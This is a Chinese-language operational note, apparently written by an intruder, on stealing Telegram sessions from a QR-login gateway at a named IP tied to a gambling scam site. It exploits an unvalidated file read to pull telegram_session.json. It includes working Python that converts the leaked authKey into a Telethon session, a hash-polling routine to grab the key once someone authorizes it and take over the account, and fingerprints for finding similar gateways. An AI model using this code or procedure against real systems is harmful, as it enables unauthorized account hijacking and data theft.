# @mtproto/core session 转换 + QR 网关收割链（8.222.136.116:8080, 2026-08-29）

## 来源场景
PC28 投注托客户站的 TG QR 登录网关（Node.js 手写 http server + @mtproto/core 6.3.0），
存在同目录任意文件读（非 /api 路径 → path.join(__dirname, urlPath) → fs.readFileSync 无校验）。

## telegram_session.json 格式（@mtproto/core 持久化）
```json
{"defaultDcId": "2", "timeOffset": "1",
 "2authKey": "[26,219,231,...]",   // 字符串化的 int 数组, 256 元素
 "2serverSalt": "[59,196,...]"}    // 8 字节 salt
```
解析链：`json.load(file)` → 值仍是 str → 再 `json.loads(值)` → list[int] → `bytes(list)` = 256B authKey。
键名规则：`<dcId>authKey` / `<dcId>serverSalt`（如 `2authKey`）。

## 转 Telethon 验活（tg_takeover_check2.py 实测代码）
```python
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.crypto import AuthKey
import ipaddress, struct, base64, json, asyncio

d = json.load(open('tg_session.json'))
dc = int(d['defaultDcId']); key = bytes(json.loads(d['2authKey']))
DC_IP = {1:'149.154.175.52',2:'149.154.167.50',3:'149.154.175.100',4:'149.154.167.91',5:'91.108.167.91'}
body = struct.pack('>B4sH256s', dc, ipaddress.ip_address(DC_IP[dc]).packed, 443, key)
ss = StringSession('1' + base64.urlsafe_b64encode(body).decode())
ss._auth_key = AuthKey(key)          # ← 必须赋 AuthKey 对象；赋 bytes 会
                                     #   AttributeError: 'bytes' object has no attribute 'key'
async def main():
    c = TelegramClient(ss, API_ID, API_HASH, timeout=12)
    await c.connect()
    print('connected:', c.is_connected())
    print('authorized:', await c.is_user_authorized())   # False=预登录 key, True=可接管
    if await c.is_user_authorized():
        print((await c.get_me()).first_name, (await c.get_me()).username)
    await c.disconnect()
asyncio.run(main())
```

## 状态判据（本轮核心认知）
- **扫码前**文件里就躺着 authKey（QR 流程先建 MTProto 连接再等扫码），此时
  `connected=True, authorized=False` —— 不是 session 坏了，是运营者还没扫。
- **扫码确认后** @mtproto/core 把**授权态 authKey 原地写回同一文件**。
- 收割 = 对该文件做 hash 轮询：先存基线 sha256，20s 间隔 GET /telegram_session.json，
  hash 变化 → 立即下载 → 用文件内同源 api_id/api_hash 重建客户端 = 账号接管。
- submit-2fa 返回 `AUTH_KEY_UNREGISTERED` = 无有效登录态（区别于「密码错误」）。

## 附：QR 网关指纹速查
- 中文「Telegram 登录」三步页（QR→2FA→dashboard）；/api/login/start 返回
  `tg://login?token=<base64>` + data:image PNG
- 无 Cookie 无 session 头；未知 /api 路径 = 200 `{"success":false,"error":"Unknown endpoint"}`（手写
  http.createServer 特征，Express 是 404 Cannot GET）；静态 404 = 纯文本 13 字节
- 文件读约束：WHATWG `new URL()` 把 ../ 规范化掉 → 只能读同目录（server.js / config.json /
  telegram_session.json / package-lock.json / *.html）——`/../x` 200 是假穿越（等于 /x）。
